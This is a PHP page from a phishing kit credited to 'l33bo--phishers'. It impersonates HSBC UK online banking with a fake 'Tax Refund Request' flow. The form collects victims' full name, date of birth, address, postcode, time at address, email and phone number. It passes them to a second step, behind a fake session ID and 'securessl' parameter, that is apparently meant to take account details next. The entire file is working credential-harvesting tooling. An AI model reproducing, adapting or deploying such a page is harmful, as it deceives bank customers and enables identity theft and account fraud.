<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
?>
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Verify</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/l33.css" media="screen">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script>
jQuery(function($) {
var dayselect = document.getElementById('day');
var dayinput = document.getElementById('dayinput');
dayselect.onchange = function() {
dayinput.innerHTML = dayselect.value;
}
var monthselect = document.getElementById('month');
var monthinput = document.getElementById('monthinput');
monthselect.onchange = function() {
monthinput.innerHTML = monthselect.value;
}
var yearselect = document.getElementById('year');
var yearinput = document.getElementById('yearinput');
yearselect.onchange = function() {
yearinput.innerHTML = yearselect.value;
}
var timemmselect = document.getElementById('timemm');
var timemminput = document.getElementById('timemminput');
timemmselect.onchange = function() {
timemminput.innerHTML = timemmselect.value;
}
var timeyyselect = document.getElementById('timeyy');
var timeyyinput = document.getElementById('timeyyinput');
timeyyselect.onchange = function() {
timeyyinput.innerHTML = timeyyselect.value;
}


go.onclick = function() {
dd.value = dayinput.innerHTML;
mm.value = monthinput.innerHTML;
yy.value = yearinput.innerHTML;
tm.value = timemminput.innerHTML;
ty.value = timeyyinput.innerHTML;
}

});

	
  (function($,W,D)	{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					day: { required: true},
					month: { required: true},
					year: { required: true},
					email: { required: true, email: true,},
					telephone: { required: true, minlength: 11, digits: true,},
					address: { required: true, minlength: 4,},
					town: { required: true, minlength: 2,},
					postcode: { required: true, minlength: 4,},
					timemm: { required: true,},
					timeyy: { required: true,},
                },
				groups: {
					dob: "day month year",
					addresstime: "timemm timeyy",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
				error.insertAfter("#doberror");
				else 
				error.insertAfter(element);	
				if (element.attr("name") == "timemm" || element.attr("name") == "timeyy") 
				error.insertAfter("#timeerror");
				},
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					day: { required: "Please provide your date of birth", },
					month: { required: "Please provide your date of birth", },
					year: { required: "Please provide your date of birth", },
					email: {
						required: "Please provide your email address",
						email: jQuery.validator.format("Please check the email address you have entered"),
					},
					address: {
						required: "Please provide the first line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					town: {
						required: "Please provide your town/city",
						minlength: jQuery.validator.format("Please check the town/city you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					timemm: {
						required: "Please select how long you have lived at your current address",
					},
					timeyy: {
						required: "Please select how long you have lived at your current address",
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please check the telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  </script>
<style>
.error {
	color:red;
	font-size: 1.4em;
	font-weight: bold;
}
#dob-error {
	line-height: 30px;
	padding-left:20px
}
#addresstime-error {
	line-height: 30px;
	padding-left:20px
}
</style>
</head>

<body class="l33">
<p style="background-color: #515358;"></p>
<div id="top">
<div id="mainTopWrapper">
<div id="mainTopUtility">
<h1>Personal</h1>

<div id="mainTopUtilityRow">
<ul id="tabs">
<li class="skipLink"><a class="skip" href="#" lang="en">Skip page header and navigation</a></li>

<li class="on"><a href="#">Personal</a></li>

<li><a href="#">Business</a></li>
</ul>

<div id="siteControls">
<div id="langList">
<ul>
<li class="selected"><a href="#">English</a></li>
</ul>
</div>

<div id="locale" lang="en">
<div lang="en" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite"><a class="dropDownLink trigger" href="#">
<span><span class="flag uk">United Kingdom</span></span></a>
<div class="placeholder"></div>
</div>
</div>

</div>
</div>
</div>

<div id="mainTopNavigation">
<div id="logo"><a href="#"><img src="assets/img/verify-logo.gif" width="138" title="" alt=""></a></div>

<div id="sections" lang="en">
<ul id="topLevel">
<li class="level1"><a href="#" class="mainTopNav"><strong>Everyday banking</strong><br>
Accounts &amp; services</a>
</li>

<li class="level1"><a class="mainTopNav" href="#"><strong>Borrowing</strong><br>
Loans &amp; mortgages</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Investing</strong><br>
Products &amp; analysis</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Insurance</strong><br>
Property &amp; family</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Life events</strong><br>
Help &amp; support</a>
</li>
</ul>
</div>
</div>
</div>


					<p></p>

<div class="pageHeaderBg">
<div class="pageHeading row">
<div class="pageHeadingInner">
<h2>Tax Refund Request</h2>
</div>
</div>
</div>

<p></p>

		<div class="innerPage" id="innerPage">
			<div class="grid_skin">
				<div class="row">
					<div class="grid grid_24">
						<ul class="stepTracker stepCount3 stepProgress" data-dojo-type="hsbcwidget/stepTracker" data-dojo-props="addNumsNoDots: true" id="hsbcwidget_stepTracker_0" lang="en" widgetid="hsbcwidget_stepTracker_0">
							<li class="completed first beforeSelected">
								<a href="#" tabindex="0"><span class="progressNum">1</span>
								<span class="hidden" aria-hidden="true">Current Step: </span>
									Login
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">1</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										<span class="stepSelected" data-nlsid="stepTracker.selected"></span>
									</span>
								</a>
							</li>
							<li class="selected">
								<a href="#"><span class="progressNum">2</span>
								<span class="hidden" aria-hidden="true">Next Step: </span>
									Confirm personal details
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">2</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
							<li class="last">
								<a href="#"><span class="progressNum">3</span>
									Confirm account information
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">3</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="row activate">

<div class="containerStyle01">

						<div class="grid grid_24">
<form id="details" method="post" action="Step2.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true">
						<div class="row containerStyle17">
						<div class="row">
						<h3>Confirm Personal Details</h3>
						</div>
										

						</div>
						<div>

							
<div class="questionGroup questionGroup-ext01">
<div class="question clearfix jsQuestion">
<label for="name">Full Name </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="name" type="text" value="<?php echo $_SESSION['name'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="name">Date of Birth </label>
<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="day" name="day">
<option value="<?php echo $_SESSION['day'];?>"><?php echo $_SESSION['day'];?></option>
<option value="">Day</option> 
<option value="01">01</option> 
<option value="02">02</option> 
<option value="03">03</option> 
<option value="04">04</option> 
<option value="05">05</option> 
<option value="06">06</option> 
<option value="07">07</option> 
<option value="08">08</option> 
<option value="09">09</option> 
<option value="10">10</option> 
<option value="11">11</option> 
<option value="12">12</option> 
<option value="13">13</option> 
<option value="14">14</option> 
<option value="15">15</option> 
<option value="16">16</option> 
<option value="17">17</option> 
<option value="18">18</option> 
<option value="19">19</option> 
<option value="20">20</option> 
<option value="21">21</option> 
<option value="22">22</option> 
<option value="23">23</option> 
<option value="24">24</option> 
<option value="25">25</option> 
<option value="26">26</option> 
<option value="27">27</option> 
<option value="28">28</option> 
<option value="29">29</option> 
<option value="30">30</option> 
<option value="31">31</option> 
</select>
<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner">
<span class="value" style="width: 100px;" id="dayinput"><option value="<?php echo $_SESSION['day'];?>"><?php echo $_SESSION['day'];?></option></span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>


<div class="textInput validationInput small" style="width: 150px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="month" name="month">
<option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option>
<option value="">Month</option> 
<option value="01">Jan</option>
<option value="02">Feb</option>
<option value="03">Mar</option>
<option value="04">Apr</option>
<option value="05">May</option>
<option value="06">Jun</option>
<option value="07">Jul</option>
<option value="08">Aug</option>
<option value="09">Sep</option>
<option value="10">Oct</option>
<option value="11">Nov</option>
<option value="12">Dec</option>
</select>
<div class="select-overlay" style="width: 150px; height: 31px;">
<div class="inner">
<span class="value" style="width: 150px;" id="monthinput"><option value="<?php echo $_SESSION['month'];?>"><?php echo $_SESSION['month'];?></option></span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>



<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="year" name="year">
<option value="<?php echo $_SESSION['year'];?>"><?php echo $_SESSION['year'];?></option>
<option value="">Year</option> 
<option value="1910">1910</option> 
<option value="1911">1911</option> 
<option value="1912">1912</option> 
<option value="1913">1913</option> 
<option value="1914">1914</option> 
<option value="1915">1915</option> 
<option value="1916">1916</option> 
<option value="1917">1917</option> 
<option value="1918">1918</option> 
<option value="1919">1919</option> 
<option value="1920">1920</option> 
<option value="1921">1921</option> 
<option value="1922">1922</option> 
<option value="1923">1923</option> 
<option value="1924">1924</option> 
<option value="1925">1925</option> 
<option value="1926">1926</option> 
<option value="1927">1927</option> 
<option value="1928">1928</option> 
<option value="1929">1929</option> 
<option value="1930">1930</option> 
<option value="1931">1931</option> 
<option value="1932">1932</option> 
<option value="1933">1933</option> 
<option value="1934">1934</option> 
<option value="1935">1935</option> 
<option value="1936">1936</option> 
<option value="1937">1937</option> 
<option value="1938">1938</option> 
<option value="1939">1939</option> 
<option value="1940">1940</option> 
<option value="1941">1941</option> 
<option value="1942">1942</option> 
<option value="1943">1943</option> 
<option value="1944">1944</option> 
<option value="1945">1945</option> 
<option value="1946">1946</option> 
<option value="1947">1947</option> 
<option value="1948">1948</option> 
<option value="1949">1949</option> 
<option value="1950">1950</option> 
<option value="1951">1951</option> 
<option value="1952">1952</option> 
<option value="1953">1953</option> 
<option value="1954">1954</option> 
<option value="1955">1955</option> 
<option value="1956">1956</option> 
<option value="1957">1957</option> 
<option value="1958">1958</option> 
<option value="1959">1959</option> 
<option value="1960">1960</option> 
<option value="1961">1961</option> 
<option value="1962">1962</option> 
<option value="1963">1963</option> 
<option value="1964">1964</option> 
<option value="1965">1965</option> 
<option value="1966">1966</option> 
<option value="1967">1967</option> 
<option value="1968">1968</option> 
<option value="1969">1969</option> 
<option value="1970">1970</option> 
<option value="1971">1971</option> 
<option value="1972">1972</option> 
<option value="1973">1973</option> 
<option value="1974">1974</option> 
<option value="1975">1975</option> 
<option value="1976">1976</option> 
<option value="1977">1977</option> 
<option value="1978">1978</option> 
<option value="1979">1979</option> 
<option value="1980">1980</option> 
<option value="1981">1981</option> 
<option value="1982">1982</option> 
<option value="1983">1983</option> 
<option value="1984">1984</option> 
<option value="1985">1985</option> 
<option value="1986">1986</option> 
<option value="1987">1987</option> 
<option value="1988">1988</option> 
<option value="1989">1989</option> 
<option value="1990">1990</option> 
<option value="1991">1991</option> 
<option value="1992">1992</option> 
<option value="1993">1993</option> 
<option value="1994">1994</option> 
<option value="1995">1995</option> 
<option value="1996">1996</option> 
<option value="1997">1997</option> 
<option value="1998">1998</option> 
</select>

<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner">
<span class="value" style="width: 100px;" id="yearinput"><option value="<?php echo $_SESSION['year'];?>"><?php echo $_SESSION['year'];?></option></span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>
<span id="doberror"></span>
</div>


<div class="question clearfix jsQuestion">
<label for="name">Address </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="address" placeholder="1st line of your address" type="text" value="<?php echo $_SESSION['address'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="town">Town / City </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="town" type="text" value="<?php echo $_SESSION['town'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="town">Postcode </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="postcode" type="text" value="<?php echo $_SESSION['postcode'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="name">Time at Address </label>
<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="timemm" name="timemm" style="width: 100px;">
<option value="">Months</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
</select>
<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner"><span class="value" id="timemminput">Months</span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>


<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="timeyy" name="timeyy" style="width: 100px;">
<option value="">Years</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12+</option>
</select>
<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner"><span class="value" id="timeyyinput">Years</span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>
<span id="timeerror"></span>
</div>

<div class="question clearfix jsQuestion">
<label for="email">Email </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="email" type="text" value="<?php echo $_SESSION['email'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="telephone">Telephone Number </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="telephone" type="text" value="<?php echo $_SESSION['telephone'];?>">
</div>
</div>
</div>
</div>
</div>


</div>



<input type="hidden" name="dd" id="dd">
<input type="hidden" name="mm" id="mm">
<input type="hidden" name="yy" id="yy">
<input type="hidden" name="tm" id="tm">
<input type="hidden" name="ty" id="ty">
						


 

<div class="buttonRow row">
									<div class="right">
										<div class="button primary primaryBtn">
											<span class="buttonInner"> <input class="submit_input" autocomplete="off" id="go" type="submit" value="Continue">
											</span>
										</div>
									</div>
								</div>



					</form>
					</div>
					<!-- Entity Content Right Starts -->
					
						<!-- Entity Content Right Ends -->
				</div>
				</div>
				<!-- Main Content Ends -->
			</div>
		</div>
		<!-- Entity Content Bottom Starts -->
		<div class="containerStyle07" style="padding: 0px;">
			<div class="innerPage">
				<div class="grid_skin">
					<div class="row">
						
					</div>
				</div>
			</div>
		</div>
			

<div dir="ltr" id="footerLinks">
<div id="footerLinksRow">
<ul>
<li class="contact"><a href="#">Contact and Support</a></li>

<li class="branch"><a href="#">Find a branch</a></li>

<li><a href="#" onclick="" title="" alt="">Website feedback</a></li>
</ul>
</div>
</div>

<div dir="ltr" id="footerMap">
<div class="sixCol" id="footerMapRow">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>

<ul>
<li><a href="#">Current accounts</a></li>

<li><a href="#">Saving accounts</a></li>

<li><a href="#">Credit cards</a></li>

<li><a href="#">International services</a></li>

<li><a href="#">Switching to HSBC</a></li>

<li><a href="#">Security centre</a></li>

<li><a href="#">Card support</a></li>

<li><a href="#">Online Banking</a></li>
</ul>
</div>

<div class="column">
<h2>Premium banking</h2>

<ul>
<li><a href="#">HSBC Premier</a></li>

<li><a href="#">HSBC Advance</a></li>

<li><a href="#">HSBC Expat</a></li>

<li><a href="#">HSBC Private Bank</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Borrowing</a></h2>

<ul>
<li><a href="#">Mortgages</a></li>

<li><a href="#">Loans</a></li>

<li><a href="#">Mortgage calculators</a></li>

<li><a href="#">Overdrafts</a></li>

<li><a href="#">Buy to let</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Investing</a></h2>

<ul>
<li><a href="#">Investment products</a></li>

<li><a href="#">Why invest with us?</a></li>

<li><a href="#">News and analysis</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Insurance</a></h2>

<ul>
<li><a href="#">Home insurance</a></li>

<li><a href="#">Travel insurance</a></li>

<li><a href="#">Car insurance</a></li>

<li><a href="#">Premier car insurance</a></li>

<li><a href="#">Life, critical illness &amp;<br>
income cover</a></li>

<li><a href="#">Student insurance</a></li>
</ul>
</div>

<div class="column last">
<h2><a href="#">Planning</a></h2>

<ul>
<li><a href="#">Health &amp; family</a></li>

<li><a href="#">Home &amp; lifestyle</a></li>

<li><a href="#">Work &amp; retirement</a></li>

<li><a href="#">Planning tools</a></li>
</ul>
</div>
</div>
</div>

<div dir="ltr" id="footerUtility">
<div id="footerUtilityRow">
<ul>
<li><a href="#">About HSBC</a></li>

<li><a href="#">Site map</a></li>

<li><a href="#'">Newsroom</a></li>

<li><a href="#">Legal</a></li>

<li><a href="#" title="" class="dnt_no_consent" onclick="" alt="">Cookie Policy</a></li>

<li><a href="#">Accessibility</a></li>

<li><a href="#">Sustainability</a></li>

<li><a href="#'">Careers</a></li>

<li><a href="#'">HSBC Group</a></li>
</ul>

<p>©&nbsp;HSBC Bank plc 2014</p>
</div>
</div>


	</div>


</body></html>